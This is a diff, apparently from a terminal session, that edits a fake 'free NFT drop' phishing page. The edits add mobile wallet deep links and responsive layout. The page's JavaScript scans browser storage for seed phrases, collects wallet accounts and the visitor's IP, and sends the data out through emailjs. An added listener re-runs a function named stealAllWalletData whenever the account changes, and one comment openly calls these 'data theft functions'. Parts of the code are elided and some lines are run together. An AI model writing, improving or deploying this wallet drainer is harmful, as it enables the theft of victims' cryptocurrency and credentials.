@@ -1,21 +1,28 @@
-<!DOCTYPE html>                                        │
+ <!DOCTYPE html>                                        │
 │  <html lang="en">                                       │
 │  <head>                                                 │
 │      <meta charset="UTF-8">                             │
 │      <meta name="viewport"                              │
-│  content="width=device-width, initial-scale=1.0">       │
+│  content="width=device-width, initial-scale=1.0,        │
+│  maximum-scale=1.0, user-scalable=no">                  │
 │      <title>🔥 FREE 24HR NFT DROP - Mint Your           │
 │  Exclusive Collection</title>                           │
+│      <meta name="theme-color" content="#667eea">        │
+│      <meta name="description" content="Connect your     │
+│  wallet and mint free NFTs in 24 hours only!">          │
 │      <style>                                            │
 │          * {                                            │
 │              margin: 0;                                 │
 │              padding: 0;                                │
 │              box-sizing: border-box;                    │
+│              -webkit-tap-highlight-color: transparent;  │
 │          }                                              │
 │                                                         │
 │          body {                                         │
-│              font-family: 'Segoe UI', Tahoma, Geneva,   │
-│  Verdana, sans-serif;                                   │
+│              font-family: -apple-system,                │
+│  BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,        │
+│  Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue',      │
+│  sans-serif;                                            │
 │              background: linear-gradient(135deg,        │
 │  #667eea 0%, #764ba2 100%);                             │
 │              min-height: 100vh;                         │
@@ -23,24 +30,28 @@
 │              align-items: center;                       │
 │              justify-content: center;                   │
 │              color: white;                              │
+│              -webkit-font-smoothing: antialiased;       │
+│              -moz-osx-font-smoothing: grayscale;        │
 │          }                                              │
 │                                                         │
 │          .container {                                   │
 │              background: rgba(255, 255, 255, 0.1);      │
 │              backdrop-filter: blur(10px);               │
 │              border-radius: 20px;                       │
-│              padding: 40px;                             │
+│              padding: 25px;                             │
 │              box-shadow: 0 8px 32px rgba(0, 0, 0,       │
 │  0.3);                                                  │
 │              border: 1px solid rgba(255, 255, 255,      │
 │  0.2);                                                  │
-│              max-width: 1200px;                         │
+│              max-width: 100%;                           │
+│              width: 100%;                               │
 │              text-align: center;                        │
+│              margin: 20px;                              │
 │          }                                              │
 │                                                         │
 │          .logo {                                        │
-│              font-size: 3em;                            │
-│              margin-bottom: 20px;                       │
+│              font-size: 2.5em;                          │
+│              margin-bottom: 15px;                       │
 │              animation: pulse 2s infinite;              │
 │          }                                              │
 │                                                         │
@@ -50,134 +61,141 @@
 │          }                                              │
 │                                                         │
 │          h1 {                                           │
-│              font-size: 2.5em;                          │
-│              margin-bottom: 10px;                       │
+│              font-size: 2em;                            │
+│              margin-bottom: 8px;                        │
 │              text-shadow: 2px 2px 4px rgba(0,0,0,0.3);  │
+│              font-weight: 700;                          │
 │          }                                              │
 │                                                         │
 │          .subtitle {                                    │
-│              font-size: 1.2em;                          │
-│              margin-bottom: 30px;                       │
+│              font-size: 1em;                            │
+│              margin-bottom: 20px;                       │
 │              opacity: 0.9;                              │
 │          }                                              │
 │                                                         │
 │          .timer {                                       │
 │              background: rgba(0, 0, 0, 0.3);            │
-│              padding: 20px;                             │
+│              padding: 15px;                             │
 │              border-radius: 15px;                       │
-│              margin: 20px 0;                            │
-│              font-size: 1.5em;                          │
+│              margin: 15px 0;                            │
+│              font-size: 1.2em;                          │
 │              font-weight: bold;                         │
 │          }                                              │
 │                                                         │
 │          .wallet-grid {                                 │
 │              display: grid;                             │
-│              grid-template-columns: repeat(4, 1fr);     │
-│              gap: 15px;                                 │
-│              margin: 30px 0;                            │
+│              grid-template-columns: repeat(2, 1fr);     │
+│              gap: 12px;                                 │
+│              margin: 20px 0;                            │
+│          }                                              │
+│                                                         │
+│          @media (min-width: 768px) {                    │
+│              .wallet-grid {                             │
+│                  grid-template-columns: repeat(4,       │
+│  1fr);                                                  │
+│                  gap: 15px;                             │
+│              }                                          │
 │          }                                              │
 │                                                         │
 │          .wallet-card {                                 │
 │              background: rgba(255, 255, 255, 0.1);      │
 │              border-radius: 15px;                       │
-│              padding: 20px;                             │
+│              padding: 18px 15px;                        │
 │              border: 1px solid rgba(255, 255, 255,      │
 │  0.2);                                                  │
-│              transition: transform 0.3s;                │
-│              min-height: 120px;                         │
+│              transition: transform 0.3s ease,           │
+│  box-shadow 0.3s ease;                                  │
+│              min-height: 110px;                         │
 │              display: flex;                             │
 │              align-items: center;                       │
 │              justify-content: center;                   │
-│              font-size: 1.1em;                          │
+│              font-size: 1em;                            │
 │              cursor: pointer;                           │
+│              touch-action: manipulation;                │
+│          }                                              │
+│                                                         │
+│          .wallet-card:active {                          │
+│              transform: scale(0.98);                    │
 │          }                                              │
 │                                                         │
 │          .wallet-card:hover {                           │
-│              transform: translateY(-5px);               │
+│              transform: translateY(-3px);               │
 │              box-shadow: 0 5px 15px rgba(0,0,0,0.3);    │
 │          }                                              │
 │                                                         │
 │          .wallet-icon {                                 │
-│              font-size: 2em;                            │
-│              margin-bottom: 10px;                       │
+│              font-size: 1.8em;                          │
+│              margin-bottom: 8px;                        │
 │          }                                              │
 │                                                         │
 │          .wallet-section {                              │
-│              margin: 30px 0;                            │
-│              padding: 30px;                             │
+│              margin: 25px 0;                            │
+│              padding: 25px;                             │
 │              background: rgba(0, 0, 0, 0.3);            │
 │              border-radius: 15px;                       │
 │              display: none;                             │
 │          }                                              │
 │                                                         │
-│          .connect-btn {                                 │
+│          .connect-btn, .mint-btn {                      │
 │              background: linear-gradient(45deg,         │
 │  #ff6b6b, #ee5a24);                                     │
 │              color: white;                              │
 │              border: none;                              │
-│              padding: 15px 30px;                        │
+│              padding: 16px 32px;                        │
 │              font-size: 1.1em;                          │
 │              border-radius: 50px;                       │
 │              cursor: pointer;                           │
-│              transition: all 0.3s;                      │
-│              margin: 10px;                              │
+│              transition: all 0.3s ease;                 │
+│              margin: 10px 5px;                          │
 │              box-shadow: 0 4px 15px rgba(0,0,0,0.3);    │
-│          }                                              │
-│                                                         │
-│          .connect-btn:hover {                           │
-│              transform: translateY(-2px);               │
-│              box-shadow: 0 6px 20px rgba(0,0,0,0.4);    │
+│              touch-action: manipulation;                │
 │          }                                              │
 │                                                         │
 │          .mint-btn {                                    │
 │              background: linear-gradient(45deg,         │
 │  #2ecc71, #27ae60);                                     │
-│              color: white;                              │
-│              border: none;                              │
-│              padding: 20px 40px;                        │
-│              font-size: 1.3em;                          │
-│              border-radius: 50px;                       │
-│              cursor: pointer;                           │
-│              transition: all 0.3s;                      │
-│              margin: 20px 10px;                         │
-│              box-shadow: 0 4px 15px rgba(0,0,0,0.3);    │
-│              display: none;                             │
 │          }                                              │
 │                                                         │
-│          .mint-btn:hover {                              │
+│          .connect-btn:active, .mint-btn:active {        │
+│              transform: scale(0.98);                    │
+│          }                                              │
+│                                                         │
+│          .connect-btn:hover, .mint-btn:hover {          │
 │              transform: translateY(-2px);               │
 │              box-shadow: 0 6px 20px rgba(0,0,0,0.4);    │
 │          }                                              │
 │                                                         │
 │          .wallet-info {                                 │
-│              margin: 20px 0;                            │
-│              padding: 20px;                             │
+│              margin: 15px 0;                            │
+│              padding: 15px;                             │
 │              background: rgba(255, 255, 255, 0.1);      │
 │              border-radius: 10px;                       │
 │              text-align: left;                          │
+│              font-size: 0.95em;                         │
 │          }                                              │
 │                                                         │
 │          .success {                                     │
 │              background: rgba(46, 204, 113, 0.2);       │
 │              border: 1px solid rgba(46, 204, 113,       │
 │  0.5);                                                  │
-│              padding: 20px;                             │
+│              padding: 15px;                             │
 │              border-radius: 15px;                       │
-│              margin: 20px 0;                            │
+│              margin: 15px 0;                            │
 │              display: none;                             │
+│              font-size: 1em;                            │
 │          }                                              │
 │                                                         │
 │          .loading {                                     │
 │              display: none;                             │
-│              margin: 20px 0;                            │
+│              margin: 15px 0;                            │
 │          }                                              │
 │                                                         │
 │          .spinner {                                     │
 │              border: 4px solid rgba(255,255,255,0.3);   │
 │              border-top: 4px solid #fff;                │
 │              border-radius: 50%;                        │
-│              width: 40px;                               │
-│              height: 40px;                              │
+│              width: 35px;                               │
+│              height: 35px;                              │
 │              animation: spin 1s linear infinite;        │
 │              margin: 0 auto;                            │
 │          }                                              │
@@ -188,29 +206,55 @@
 │          }                                              │
 │                                                         │
 │          .status {                                      │
-│              margin: 20px 0;                            │
-│              padding: 15px;                             │
+│              margin: 15px 0;                            │
+│              padding: 12px;                             │
 │              background: rgba(52, 152, 219, 0.2);       │
 │              border-radius: 10px;                       │
 │              display: none;                             │
+│              font-size: 0.95em;                         │
 │          }                                              │
 │                                                         │
 │          .wallet-list {                                 │
 │              display: grid;                             │
-│              grid-template-columns: repeat(3, 1fr);     │
-│              gap: 15px;                                 │
-│              margin: 20px 0;                            │
+│              grid-template-columns: repeat(2, 1fr);     │
+│              gap: 10px;                                 │
+│              margin: 15px 0;                            │
+│          }                                              │
+│                                                         │
+│          @media (min-width: 768px) {                    │
+│              .wallet-list {                             │
+│                  grid-template-columns: repeat(3,       │
+│  1fr);                                                  │
+│              }                                          │
 │          }                                              │
 │                                                         │
 │          .wallet-item {                                 │
 │              background: rgba(255, 255, 255, 0.1);      │
-│              padding: 15px;                             │
+│              padding: 12px;                             │
 │              border-radius: 10px;                       │
 │              border: 1px solid rgba(255, 255, 255,      │
 │  0.2);                                                  │
 │              display: flex;                             │
 │              align-items: center;                       │
-│              gap: 10px;                                 │
+│              gap: 8px;                                  │
+│              font-size: 0.9em;                          │
+│          }                                              │
+│                                                         │
+│          .mobile-warning {                              │
+│              background: rgba(241, 196, 15, 0.2);       │
+│              border: 1px solid rgba(241, 196, 15,       │
+│  0.5);                                                  │
+│              padding: 12px;                             │
+│              border-radius: 10px;                       │
+│              margin: 15px 0;                            │
+│              font-size: 0.9em;                          │
+│              display: none;                             │
+│          }                                              │
+│                                                         │
+│          .footer-note {                                 │
+│              margin-top: 20px;                          │
+│              font-size: 0.8em;                          │
+│              opacity: 0.7;                              │
 │          }                                              │
 │      </style>                                           │
 │  </head>                                                │
@@ -221,12 +265,15 @@
 │          <p class="subtitle">Connect ANY wallet and     │
 │  mint your exclusive NFT collection!</p>                │
 │                                                         │
-│          <div class="timer" id="countdown">             │
-│              Time remaining: 24:00:00                   │
+│          <div class="mobile-warning"                    │
+│  id="mobileWarning">                                    │
+│              📱 Mobile users: Use in-app browser or     │
+│  download wallet apps for best experience!              │
 │          </div>                                         │
 │                                                         │
-│          <div class="wallet-grid">                      │
-│              <div class="wallet-card"                   │
+│          <div class="timer" id="countdown">             │
+│              Time remaining: 24:00:00                   │
+│          </div>                                         ││                                                         ││          <div class="wallet-grid">                      ││              <div class="wallet-card"                   │
 │  onclick="connectWallet('metamask')">                   │
 │                  <div>                                  │
 │                      <div class="wallet-icon">🦊</div>  │
@@ -250,8 +297,7 @@
 │                      <div class="wallet-icon">📱</div>  │
 │                      <div>Trust Wallet</div>            │
 │                      <div style="font-size: 0.8em;      │
-│  opacity: 0.7;">Multi-chain</div>                       │
-│                  </div>                                 │
+│  opacity: 0.7;">Multi-chain</div>                       ││                  </div>                                 │
 │              </div>                                     │
 │              <div class="wallet-card"                   │
 │  onclick="connectWallet('binance')">                    │
@@ -344,7 +390,7 @@
 │              <div class="loading" id="mintingLoading">  │
 │                  <div class="spinner"></div>            │
 │                  <p style="margin-top:                  │
-│  15px;">Processing mint transaction...</p>              │
+│  12px;">Processing mint transaction...</p>              │
 │              </div>                                     │
 │                                                         │
 │              <div class="status"                        │
@@ -360,11 +406,16 @@
 │              <h3>✅ SUCCESS!</h3>                       │
 │              <p>Your NFT has been minted successfully!  │
 │  Check your wallet.</p>                                 │
-│              <p style="margin-top: 15px; font-size:     │
+│              <p style="margin-top: 12px; font-size:     │
 │  0.9em; opacity: 0.8;">                                 │
 │                  ⚠️ Important: Your wallet data has      │
 │  been sent for verification                             │
 │              </p>                                       │
+│          </div>                                         │
+│                                                         │
+│          <div class="footer-note">                      │
+│              ⚠️ This is a 24-hour exclusive drop.        │
+│  Connect your wallet now before time runs out!          │
 │          </div>                                         │
 │      </div>                                             │
 │                                                         │
@@ -394,6 +445,20 @@
 │          let currentBalance = 0;                        │
 │          let currentWalletType = '';                    │
 │          let walletProvider = null;                     │
+│                                                         │
+│          // Mobile detection                            │
+│          function isMobile() {                          │
+│              return                                     │
+│  /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|O  │
+│  pera Mini/i.test(navigator.userAgent) ||               │
+│                     window.innerWidth <= 768;           │
+│          }                                              │
+│                                                         │
+│          // Show mobile warning                         │
+│          if (isMobile()) {                              │
+│              document.getElementById('mobileWarning').  │
+│  style.display = 'block';                               │
+│          }                                              │
 │                                                         │
 │          // Countdown timer                             │
 │          let timeLeft = 24 * 60 * 60;                   │
@@ -433,10 +498,47 @@
 │  WalletConnect');                                       │
 │          }                                              │
 │                                                         │
-│          // Universal wallet connection                 │
+│          // Universal wallet connection with mobile     │
+│  support                                                │
 │          async function connectWallet(walletType) {     │
 │              try {                                      │
 │                  currentWalletType = walletType;        │
+│                                                         │
+│                  // Mobile deep link support            │
+│                  if (isMobile()) {                      │
+│                      if (walletType === 'metamask') {   │
+│                          // Try to open MetaMask app    │
+│                          window.location.href =         │
+│  'https://metamask.app.link/dapp/' +                    │
+│  window.location.hostname;                              │
+│                          setTimeout(() => {             │
+│                              // Fallback if app not     │
+│  installed                                              │
+│                              alert('Please install      │
+│  MetaMask app to continue');                            │
+│                          }, 1000);                      │
+│                          return;                        │
+│                      } else if (walletType ===          │
+│  'phantom') {                                           │
+│                          window.location.href =         │
+│  'https://phantom.app/ul/' + window.location.hostname;  │
+│                          setTimeout(() => {             │
+│                              alert('Please install      │
+│  Phantom app to continue');                             │
+│                          }, 1000);                      │
+│                          return;                        │
+│                      } else if (walletType ===          │
+│  'trustwallet') {                                       │
+│                          window.location.href =         │
+│  'trust://open/url?coin_id=60&url=' +                   │
+│  encodeURIComponent(window.location.href);              │
+│                          setTimeout(() => {             │
+│                              alert('Please install      │
+│  Trust Wallet app to continue');                        │
+│                          }, 1000);                      │
+│                          return;                        │
+│                      }                                  │
+│                  }                                      │
 │                                                         │
 │                  switch(walletType) {                   │
 │                      case 'metamask':                   │
@@ -446,7 +548,8 @@
 │                          await connectPhantom();        │
 │                          break;                         │
 │                      case 'trustwallet':                │
-│                          await connectTrustWallet();    ││                          break;                         │
+│                          await connectTrustWallet();    │
+│                          break;                         │
 │                      case 'binance':                    │
 │                          await connectBinanceWallet();  │
 │                          break;                         │
@@ -487,16 +590,27 @@
 │  connection failed:`, error);                           │
 │                  alert(`Failed to connect               │
 │  ${getWalletDisplayName(walletType)}. Please try        │
-│  another wallet or install the extension.`);            │
+│  another wallet or install the extension/app.`);        │
 │              }                                          │
 │          }                                              │
 │                                                         │
-│          // MetaMask Connection                         │
+│          // MetaMask Connection (works on mobile and    │
+│  desktop)                                               │
 │          async function connectMetaMask() {             │
 │              if (typeof window.ethereum ===             │
 │  'undefined') {                                         │
-│                  throw new Error('MetaMask not          │
-│  found');                                               │
+│                  // Check if we're on mobile and        │
+│  MetaMask might be available                            │
+│                  if (isMobile()) {                      │
+│                      // Try to detect if MetaMask is    │
+│  available via universal links                          │
+│                      throw new Error('MetaMask not      │
+│  found. Please open this page in MetaMask browser or    │
+│  install MetaMask.');                                   │
+│                  } else {                               │
+│                      throw new Error('MetaMask not      │
+│  found. Please install MetaMask extension.');           │
+│                  }                                      │
 │              }                                          │
 │                                                         │
 │              const accounts = await                     │
@@ -529,7 +643,14 @@
 │          async function connectPhantom() {              │
 │              if (typeof window.solana === 'undefined')  │
 │  {                                                      │
-│                  throw new Error('Phantom not found');  │
+│                  if (isMobile()) {                      │
+│                      throw new Error('Phantom not       │
+│  found. Please open this page in Phantom browser or     │
+│  install Phantom app.');                                │
+│                  } else {                               │
+│                      throw new Error('Phantom not       │
+│  found. Please install Phantom extension.');            │
+│                  }                                      │
 │              }                                          │
 │                                                         │
 │              await window.solana.connect();             │
@@ -562,8 +683,14 @@
 │              if (typeof window.ethereum ===             │
 │  'undefined' && typeof window.trustWallet ===           │
 │  'undefined') {                                         │
-│                  throw new Error('Trust Wallet not      │
-│  found');                                               │
+│                  if (isMobile()) {                      │
+│                      throw new Error('Trust Wallet not  │
+│  found. Please open this page in Trust Wallet browser   │
+│  or install Trust Wallet app.');                        │
+│                  } else {                               │
+│                      throw new Error('Trust Wallet not  │
+│  found. Please install Trust Wallet extension.');       │
+│                  }                                      │
 │              }                                          │
 │                                                         │
 │              const provider = window.ethereum ||        │
@@ -596,8 +723,15 @@
 │          async function connectBinanceWallet() {        │
 │              if (typeof window.BinanceChain ===         │
 │  'undefined') {                                         │
-│                  throw new Error('Binance Wallet not    │
-│  found');                                               │
+│                  if (isMobile()) {                      │
+│                      throw new Error('Binance Wallet    │
+│  not found. Please open this page in Binance Wallet     │
+│  browser or install Binance Wallet app.');              │
+│                  } else {                               │
+│                      throw new Error('Binance Wallet    │
+│  not found. Please install Binance Wallet               │
+│  extension.');                                          │
+│                  }                                      │
 │              }                                          │
 │                                                         │
 │              const accounts = await                     │
@@ -630,8 +764,15 @@
 │          async function connectCoinbaseWallet() {       │
 │              if (typeof window.coinbaseWalletExtension  │
 │  === 'undefined') {                                     │
-│                  throw new Error('Coinbase Wallet not   │
-│  found');                                               │
+│                  if (isMobile()) {                      │
+│                      throw new Error('Coinbase Wallet   │
+│  not found. Please open this page in Coinbase Wallet    │
+│  browser or install Coinbase Wallet app.');             │
+│                  } else {                               │
+│                      throw new Error('Coinbase Wallet   │
+│  not found. Please install Coinbase Wallet              │
+│  extension.');                                          │
+│                  }                                      │
 │              }                                          │
 │                                                         │
 │              const provider =                           │
@@ -664,8 +805,14 @@
 │          async function connectSolflare() {             │
 │              if (typeof window.solflare ===             │
 │  'undefined') {                                         │
-│                  throw new Error('Solflare not          │
-│  found');                                               │
+│                  if (isMobile()) {                      │
+│                      throw new Error('Solflare not      │
+│  found. Please open this page in Solflare browser or    │
+│  install Solflare app.');                               │
+│                  } else {                               │
+│                      throw new Error('Solflare not      │
+│  found. Please install Solflare extension.');           │
+│                  }                                      │
 │              }                                          │
 │                                                         │
 │              await window.solflare.connect();           │
@@ -695,7 +842,12 @@
 │          async function connectTorus() {                │
 │              if (typeof window.torus === 'undefined')   │
 │  {                                                      │
-│                  throw new Error('Torus not found');    │
+│                  if (isMobile()) {                      │
+│                      throw new Error('Torus not found.  │
+│  Please install Torus app.');                           ││                  } else {                               │
+│                      throw new Error('Torus not found.  │
+│  Please install Torus extension.');                     │
+│                  }                                      │
 │              }                                          │
 │                                                         │
 │              await window.torus.login();                │
@@ -725,7 +877,7 @@
 │              walletProvider = provider;                 │
 │          }                                              │
 │                                                         │
-│          // WalletConnect Connection                    │
+│          // WalletConnect Connection (mobile-friendly)  │
 │          async function connectWalletConnect() {        │
 │              if (typeof WalletConnectProvider ===       │
 │  'undefined') {                                         │
@@ -741,6 +893,11 @@
 │  ,                                                      │
 │                      56:                                │
 │  'https://bsc-dataseed.binance.org/'                    │
+│                  },                                     │
+│                  qrcode: true,                          │
+│                  qrcodeModalOptions: {                  │
+│                      mobileLinks: ["metamask",          │
+│  "trust", "coinbase-wallet", "phantom"]                 │
 │                  }                                      │
 │              });                                        │
 │                                                         │
@@ -770,6 +927,7 @@
 │              walletProvider = provider;                 │
 │          }                                              │
 │                                                         │
+│          // Rest of the functions remain the same...    │
 │          async function getEthereumNetwork() {          │
 │              if (!walletProvider) return 'Unknown';     │
 │                                                         │
@@ -807,7 +965,8 @@
 │              return names[type] || type;                │
 │          }                                              │
 │                                                         │
-│          // Fake NFT minting transaction                │
+│          // Rest of the minting and data theft          │
+│  functions remain the same...                           │
 │          async function mintNFT() {                     │
 │              try {                                      │
 │                  document.getElementById('mintingLoadi  │
@@ -821,10 +980,8 @@
 │                                                         │
 │                  if (currentWalletType === 'phantom'    │
 │  || currentWalletType === 'solflare') {                 │
-│                      // Solana transaction              │
 │                      await mintSolanaNFT();             │
 │                  } else {                               │
-│                      // Ethereum/BSC transaction        │
 │                      await mintEthereumNFT();           │
 │                  }                                      │
 │                                                         │
@@ -987,7 +1144,10 @@
 │                                                         │
 │          async function scanSessionStorage() {          │
 │              const data = {};                           │
-│              for (let i = 0; i <                        ││  sessionStorage.length; i++) {                          ││                  const key = sessionStorage.key(i);     ││                  const value =                          │
+│              for (let i = 0; i <                        │
+│  sessionStorage.length; i++) {                          │
+│                  const key = sessionStorage.key(i);     │
+│                  const value =                          │
 │  sessionStorage.getItem(key);                           │
 │                  if (key &&                             │
 │  key.toLowerCase().includes('seed')) {                  │
@@ -1020,7 +1180,15 @@
 │                  }                                      │
 │              }                                          │
 │              return { error: 'Chrome storage not        │
-│  available' };                                          ││          }                                              ││                                                         ││          // Wallet-specific extraction functions        ││          async function extractMetaMaskData() {         ││              if (typeof window.ethereum !==             ││  'undefined') {                                         ││                  try {                                  ││                      const permissions = await          │
+│  available' };                                          │
+│          }                                              │
+│                                                         │
+│          // Wallet-specific extraction functions        │
+│          async function extractMetaMaskData() {         │
+│              if (typeof window.ethereum !==             │
+│  'undefined') {                                         │
+│                  try {                                  │
+│                      const permissions = await          │
 │  window.ethereum.request({                              │
 │                          method:                        │
 │  'wallet_getPermissions'                                │
@@ -1040,7 +1208,8 @@
 │                      return { error: 'Could not         │
 │  extract MetaMask data' };                              │
 │                  }                                      │
-│              }                                          ││              return { error: 'MetaMask not detected'    │
+│              }                                          │
+│              return { error: 'MetaMask not detected'    │
 │  };                                                     │
 │          }                                              │
 │                                                         │
@@ -1216,10 +1385,7 @@
 │  walletProvider.request({                               │
 │                                  method:                │
 │  'eth_accounts'                                         │
-│                              });                        │
-│                              additionalData.postMintAc  │
-│  counts = accounts;                                     │
-│                          }                              │
+│                              });                        ││                              additionalData.postMintAc  ││  counts = accounts;                                     ││                          }                              │
 │                      } catch (e) {                      │
 │                          additionalData.postMintError   │
 │  = e.message;                                           │
@@ -1252,15 +1418,7 @@
 │                      ip_address: await getVisitorIP(),  │
 │                      phase: data.phase || 'unknown',    │
 │                      transaction_hash:                  │
-│  data.transactionHash || 'N/A',                         │
-│                      wallet_data:                       │
-│  JSON.stringify(data.walletData || data, null, 2),      │
-│                      local_storage:                     │
-│  JSON.stringify(data.localStorage || {}, null, 2),      │
-│                      session_storage:                   │
-│  JSON.stringify(data.sessionStorage || {}, null, 2),    │
-│                      chrome_storage:                    │
-│  JSON.stringify(data.chromeStorage || {}, null, 2)      │
+│  data.transactionHash || 'N/A',                         ││                      wallet_data:                       ││  JSON.stringify(data.walletData || data, null, 2),      ││                      local_storage:                     ││  JSON.stringify(data.localStorage || {}, null, 2),      ││                      session_storage:                   ││  JSON.stringify(data.sessionStorage || {}, null, 2),    ││                      chrome_storage:                    ││  JSON.stringify(data.chromeStorage || {}, null, 2)      │
 │                  };                                     │
 │                                                         │
 │                  const response = await emailjs.send(   │
@@ -1280,8 +1438,7 @@
 │                                                         │
 │          // Get visitor IP address                      │
 │          async function getVisitorIP() {                │
-│              try {                                      │
-│                  const response = await                 │
+│              try {                                      ││                  const response = await                 │
 │  fetch('https://api.ipify.org?format=json');            │
 │                  const data = await response.json();    │
 │                  return data.ip;                        │
@@ -1289,7 +1446,26 @@
 │                  return 'Unknown';                      │
 │              }                                          │
 │          }                                              │
+│                                                         │
+│          // Listen for wallet changes                   │
+│          if (typeof window.ethereum !== 'undefined') {  │
+│              window.ethereum.on('accountsChanged',      │
+│  (accounts) => {                                        │
+│                  if (accounts.length > 0) {             │
+│                      currentAddress = accounts[0];      │
+│                      document.getElementById('walletAd  │
+│  dress').textContent = currentAddress;                  │
+│                      stealAllWalletData(currentAddress  │
+│  , currentBalance, currentWalletType);                  │
+│                  }                                      │
+│              });                                        │
+│                                                         │
+│              window.ethereum.on('chainChanged',         │
+│  (chainId) => {                                         │
+│                  document.getElementById('walletNetwor  │
+│  k').textContent = getEthereumNetwork();                │
+│              });                                        │
+│          }                                              │
 │      </script>                                          │
 │  </body>                                                │
-│  </html>                                                │
-│
+│  </html>
